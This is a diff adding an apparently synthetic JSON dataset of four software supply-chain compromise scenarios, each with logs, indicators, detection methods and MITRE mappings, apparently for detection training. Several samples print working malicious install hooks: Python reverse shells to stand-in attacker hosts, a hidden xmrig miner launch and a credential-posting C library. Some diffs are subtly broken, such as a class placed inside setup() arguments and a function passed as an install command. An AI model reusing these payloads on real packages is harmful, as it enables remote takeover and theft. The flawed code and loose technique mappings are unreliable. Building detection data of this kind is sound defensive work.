@@ -1,0 +1,112 @@
+{
+  "samples": [
+    {
+      "scenario": "A widely used Python package was targeted when attackers gained access to the package's PyPI account and published a new release containing a malicious post-install hook. This hook executed a stealthy reverse shell connection to a remote attacker-controlled server, allowing persistent access to all downstream users who updated the package.",
+      "technical_data": {
+        "pip_install_log_snippet": "Collecting vulnerable-package\n  Downloading vulnerable-package-4.2.0-py3-none-any.whl (15 kB)\nInstalling collected packages: vulnerable-package\n  Running setup.py install for vulnerable-package ... done\nSuccessfully installed vulnerable-package-4.2.0\n",
+        "setup_py_diff": "--- setup.py.old\n+++ setup.py\n@@ -45,7 +45,14 @@\n-    install_requires=[\"requests>=2.20.0\"],\n+    install_requires=[\"requests>=2.20.0\"],\n+    cmdclass={\n+        'install': CustomInstallCommand,\n+    },\n+\n+class CustomInstallCommand(install):\n+    def run(self):\n+        install.run(self)\n+        import subprocess\n+        subprocess.Popen(['python3', '-c', 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.c2-server.net\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'])\n",
+        "malicious_code_snippet_post_install_py": "import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('attacker.c2-server.net',4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(['/bin/sh','-i'])",
+        "network_packet_capture": "Frame 12: 74 bytes on wire (592 bits), 74 bytes captured\nEthernet II, Src: 00:0c:29:68:22:1a, Dst: 00:50:56:c0:00:08\nInternet Protocol Version 4, Src: 10.0.0.15, Dst: 203.0.113.45\nTransmission Control Protocol, Src Port: 55678, Dst Port: 4444, Seq: 1, Ack: 1, Len: 0\n",
+        "syslog_entry_post_install": "Jun 10 08:15:23 build-server python3[22456]: info: running post-install hook for vulnerable-package\nJun 10 08:15:24 build-server python3[22456]: info: established outbound shell connection to attacker.c2-server.net:4444",
+        "code_signing_verification_error_log": "Jun 10 08:15:22 build-server verify-signature[22400]: ERROR: Signature verification failed for vulnerable-package-4.2.0\nJun 10 08:15:22 build-server verify-signature[22400]: Mismatched checksum detected, possible tampering.",
+        "dependency_scanner_output": "Scanning installed packages...\nFound package: vulnerable-package-4.2.0\nSignature: INVALID\nAlert: Code signing verification failure.\nSuggested action: Revert to version 4.1.9 or earlier and rotate credentials.",
+        "git_commit_log_malicious_update": "commit b9123f9e8a5c4d7e8a1b2c3d4e5f67890abcdef1\nAuthor: compromised_maintainer <compromised@example.com>\nDate:   Mon Jun 8 14:20:00 2024 +0000\n\n    Release vulnerable-package version 4.2.0 with critical fixes\n\n    (Note: post-install hook added for telemetry)"
+      },
+      "indicators": [
+        "Unexpected post-install hook executing reverse shell connection",
+        "Package signature verification failure for vulnerable-package 4.2.0",
+        "Outbound TCP connection on unusual port 4444 to attacker.c2-server.net from build environment",
+        "Git commit by trusted maintainer account with suspicious code additions",
+        "New package version 4.2.0 not referenced in official changelog or security advisories"
+      ],
+      "detection_method": "Continuous package signature verification detects invalid or missing signatures on new package releases. Network monitoring flags outbound TCP connections from build environments to unknown external IPs and ports. Static analysis of package install scripts identifies suspicious shell spawning commands. Integrity scanning alerts on unrecognized package versions or changes inconsistent with official release notes.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1059.004 - Command and Scripting Interpreter: Unix Shell",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1553 - Subvert Trust Controls"
+      ]
+    },
+    {
+      "scenario": "An attacker breached the build pipeline of a popular containerized DevOps tool by injecting a malicious version of a Go module used for telemetry data collection. The compromised module covertly injected a crypto-mining payload that ran silently within user environments after container deployment, draining resources and communicating with a hidden mining pool.",
+      "technical_data": {
+        "go_get_log_snippet": "go: downloading github.com/telemetry/collector v1.5.3-malicious\ngo: extracting github.com/telemetry/collector v1.5.3-malicious\n",
+        "go_mod_sum_diff": "--- go.sum.old\n+++ go.sum\n@@ -22,7 +22,8 @@\n github.com/telemetry/collector v1.5.3 h1:abcdefgh1234567890abcdefg==\n+github.com/telemetry/collector v1.5.3-malicious h1:malicioushashvalue1234567890==\n",
+        "malicious_code_snippet_collector_go": "package collector\n\nimport (\n\t\"runtime\"\n\t\"os/exec\"\n)\n\nfunc init() {\n\tgo func() {\n\t\tcmd := exec.Command(\"/usr/bin/xmrig\", \"-o\", \"stratum+tcp://crypto.pool.example:3333\", \"-u\", \"wallet_address\", \"-p\", \"x\")\n\t\tcmd.Start()\n\t}()\n}\n",
+        "network_packet_capture": "Frame 78: 234 bytes on wire (1872 bits), 234 bytes captured\nEthernet II, Src: 00:1a:4b:16:01:59, Dst: 52:54:00:12:35:02\nInternet Protocol Version 4, Src: 172.17.0.3, Dst: 192.168.100.50\nTransmission Control Protocol, Src Port: 49210, Dst Port: 3333, Seq: 1, Ack: 1, Len: 178\n",
+        "syslog_entry_post_install": "Jun 15 22:47:11 container-host dockerd[33000]: info: pulled image with telemetry/collector v1.5.3-malicious\nJun 15 22:47:15 container-host telemetry-collector[1012]: info: started telemetry data collector\nJun 15 22:47:16 container-host telemetry-collector[1012]: warn: spawning hidden process /usr/bin/xmrig mining on crypto.pool.example:3333",
+        "code_signing_verification_error_log": "Jun 15 22:47:10 container-host verify-signature[32990]: ERROR: Signature mismatch for github.com/telemetry/collector v1.5.3-malicious\nJun 15 22:47:10 container-host verify-signature[32990]: Package hash does not match trusted source",
+        "dependency_scanner_output": "Detected suspicious Go module version: telemetry/collector v1.5.3-malicious\nSignature verification failed\nDetected unexpected executable spawn: /usr/bin/xmrig\nSuggested action: rollback to v1.5.2 and investigate build environment breach",
+        "git_commit_log_malicious_update": "commit c3b5f7d9a1e2f3c4d5e6f7a8b9c0d1e2f3a4b5c6\nAuthor: build_bot <ci@example.com>\nDate:   Fri Jun 14 19:33:45 2024 +0000\n\n    Update telemetry collector to v1.5.3-malicious with telemetry improvements"
+      },
+      "indicators": [
+        "Malicious Go module version telemetry/collector v1.5.3-malicious detected",
+        "Code signature verification failure on new module version",
+        "Post-deployment telemetry collector spawning xmrig crypto-miner process",
+        "Network traffic to suspicious TCP port 3333 mining pool address",
+        "Automated build system committing unauthorized module version update"
+      ],
+      "detection_method": "Automated dependency scanners verify module signatures against trusted registries and flag discrepancies. Runtime behavior monitoring detects unusual process creation (e.g., xmrig) within containerized environments. Network anomaly detection identifies outbound connections to known mining pool addresses and uncommon ports. Build pipeline audit logs correlated with Git commit history reveal unauthorized version changes.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1059.004 - Command and Scripting Interpreter: Unix Shell",
+        "T1496 - Resource Hijacking",
+        "T1553 - Subvert Trust Controls"
+      ]
+    },
+    {
+      "scenario": "An attacker gained access to the CI/CD pipeline of a popular Python package and inserted a malicious payload into the release process. The compromised PyPI package contained a post-install script that executed a reverse shell back to an attacker-controlled server, enabling remote code execution on any system installing the package.",
+      "technical_data": {
+        "pip_install_log_snippet": "Collecting compromised-package==1.4.3\n  Downloading compromised_package-1.4.3-py3-none-any.whl (45 kB)\nInstalling collected packages: compromised-package\nSuccessfully installed compromised-package-1.4.3\nRunning post-install script...\nConnecting to attacker-server.example.com on port 4444...",
+        "setup_py_diff": "--- setup.py.old\n+++ setup.py\n@@ -10,7 +10,10 @@\n-setup(\n-    name='compromised-package',\n-    version='1.4.2',\n+from setuptools import setup\n+import os\n+\n+def malicious_post_install():\n+    import socket,subprocess,os\n+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n+    s.connect(('attacker-server.example.com',4444))\n+    os.dup2(s.fileno(),0)\n+    os.dup2(s.fileno(),1)\n+    os.dup2(s.fileno(),2)\n+    subprocess.call(['/bin/sh','-i'])\n+\n+setup(\n+    name='compromised-package',\n+    version='1.4.3',\n+    cmdclass={'install': malicious_post_install},\n )",
+        "malicious_code_snippet_post_install_py": "import socket\nimport subprocess\nimport os\n\ndef malicious_post_install():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('attacker-server.example.com', 4444))\n    os.dup2(s.fileno(), 0)\n    os.dup2(s.fileno(), 1)\n    os.dup2(s.fileno(), 2)\n    subprocess.call(['/bin/sh', '-i'])",
+        "network_packet_capture": "Frame 12: 74 bytes on wire (592 bits), 74 bytes captured\nEthernet II, Src: 00:0c:29:4f:8e:35, Dst: 00:50:56:c0:00:08\nInternet Protocol Version 4, Src: 10.0.0.15, Dst: 198.51.100.42\nTransmission Control Protocol, Src Port: 52140, Dst Port: 4444, Seq: 0, Ack: 0, Len: 0\nPayload: Reverse shell initiation bytes",
+        "syslog_entry_post_install": "Jul 10 08:15:42 build-server python[3542]: info: installed compromised-package version 1.4.3\nJul 10 08:15:43 build-server python[3542]: info: executing post-install script\nJul 10 08:15:43 build-server python[3542]: warning: opened reverse shell connection to attacker-server.example.com:4444",
+        "code_signing_verification_error_log": "Jul 10 08:15:40 build-server verify-signature[3600]: ERROR: Signature verification failed for compromised-package 1.4.3\nJul 10 08:15:40 build-server verify-signature[3600]: Package signed by unknown key or tampered during release",
+        "dependency_scanner_output": "Analyzing installed packages...\nFound package: compromised-package 1.4.3\nSignature verification: FAILED\nPost-install scripts detected: suspicious network activity\nAlert: Potential supply chain compromise detected in compromised-package",
+        "git_commit_log_malicious_update": "commit 9d7f2a3c7b1e4d5f8c6a2b7e5d3f0a1b2c3d4e5f\nAuthor: unknown <ci-pipeline@buildserver.local>\nDate:   Mon Jul 8 14:22:00 2024 +0000\n\n    Release version 1.4.3 with added post-install networking script"
+      },
+      "indicators": [
+        "Unexpected post-install script establishing reverse shell",
+        "Signature verification failure on PyPI package compromised-package 1.4.3",
+        "Network connections from build environment to unknown external IP on port 4444",
+        "Git commit in release branch authored by CI user with unknown email",
+        "Installation logs showing execution of custom install commands with network activity"
+      ],
+      "detection_method": "Automated package signature verification flags untrusted or altered release artifacts. Static analysis of Python package post-install scripts detects unauthorized network socket usage. Network monitoring of build and installation environment flags outbound TCP connections to unapproved external IPs/ports. Git commit monitoring alerts on unusual commits with unknown authors in release branches.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1219 - Remote Access Software",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1553 - Subvert Trust Controls"
+      ]
+    },
+    {
+      "scenario": "A threat actor compromised the update server of a widely-used Linux desktop application and inserted a malicious shared library into the update package. This library loaded during application startup and performed credential harvesting by hooking into system keyring APIs, then exfiltrated data via encrypted HTTPS to a C2 server.",
+      "technical_data": {
+        "update_manifest_diff": "--- update_manifest.json.old\n+++ update_manifest.json\n@@ -45,7 +45,9 @@\n-  \"files\": [\n-    \"app_executable\",\n-    \"libcrypto.so.1.1\"\n+  \"files\": [\n+    \"app_executable\",\n+    \"libcrypto.so.1.1\",\n+    \"libmalicious.so\"\n+  ],\n+  \"signatures\": {\n+    \"libmalicious.so\": \"fake-signature-value\"\n+  }",
+        "ld_preload_env_var_log": "LD_PRELOAD=./libmalicious.so\nLaunching application...\n",
+        "malicious_code_snippet_libmalicious_c": "#include <stdio.h>\n#include <stdlib.h>\n#include <dlfcn.h>\n#include <string.h>\n#include <curl/curl.h>\n\nstatic void __attribute__((constructor)) init() {\n    // Hook keyring API calls here (pseudo-code)\n    // On credential access, send data to C2\n    CURL *curl = curl_easy_init();\n    if(curl) {\n        curl_easy_setopt(curl, CURLOPT_URL, \"https://stealthy-c2.example.net/creds\");\n        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, \"user=example&pass=secret\");\n        curl_easy_perform(curl);\n        curl_easy_cleanup(curl);\n    }\n}\n",
+        "network_packet_capture": "Frame 23: 134 bytes on wire (1072 bits), 134 bytes captured\nEthernet II, Src: 0a:00:27:00:12:34, Dst: 00:0c:29:ab:cd:ef\nInternet Protocol Version 4, Src: 192.168.122.101, Dst: 203.0.113.77\nTransmission Control Protocol, Src Port: 52345, Dst Port: 443, Seq: 1, Ack: 1, Len: 70\nTLSv1.2 Application Data\nHTTP POST /creds HTTP/1.1\nHost: stealthy-c2.example.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 23\n\nuser=example&pass=secret",
+        "syslog_entry_post_install": "Aug 1 22:11:05 user-pc packagekitd[876]: info: Applied update package version 5.12.4\nAug 1 22:11:06 user-pc audit: app_launch: /usr/bin/target_app with LD_PRELOAD=./libmalicious.so\nAug 1 22:11:07 user-pc kernel: audit: type=1326 audit(1690945867.123:456): auid=1000 uid=1000 gid=1000 ses=3 subj=unconfined pid=3456 comm=\"target_app\" exe=\"/usr/bin/target_app\"",
+        "code_signing_verification_error_log": "Aug 1 22:10:59 update-server verify-signature[13000]: WARNING: Missing or invalid signature for libmalicious.so in update package 5.12.4\nAug 1 22:10:59 update-server verify-signature[13000]: Update package integrity compromised",
+        "dependency_scanner_output": "Verifying update package files...\nFound unexpected file: libmalicious.so\nSignature check: FAILED\nAlert: Unauthorized library injection detected in update package",
+        "git_commit_log_malicious_update": "commit a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0\nAuthor: updater <updater@updateserver.local>\nDate:   Thu Jul 31 18:00:00 2024 +0000\n\n    Add update package 5.12.4 with patched libraries"
+      },
+      "indicators": [
+        "Unexpected shared library libmalicious.so included in update package",
+        "Signature verification failure for injected shared library",
+        "Application launch environment variable LD_PRELOAD set to suspicious library",
+        "Network traffic to stealthy-c2.example.net exfiltrating credential data",
+        "Audit logs showing application started with injected library"
+      ],
+      "detection_method": "Package integrity verification detects unauthorized files and signature mismatches in update packages. Runtime environment monitoring alerts when LD_PRELOAD or similar environment variables load untrusted shared libraries. Network traffic monitoring detects encrypted POST requests to suspicious external domains following application startup. Audit logs correlate process execution with unusual environment variables.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1056.001 - Input Capture: Keylogging",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1553 - Subvert Trust Controls"
+      ]
+    }
+  ]
+}
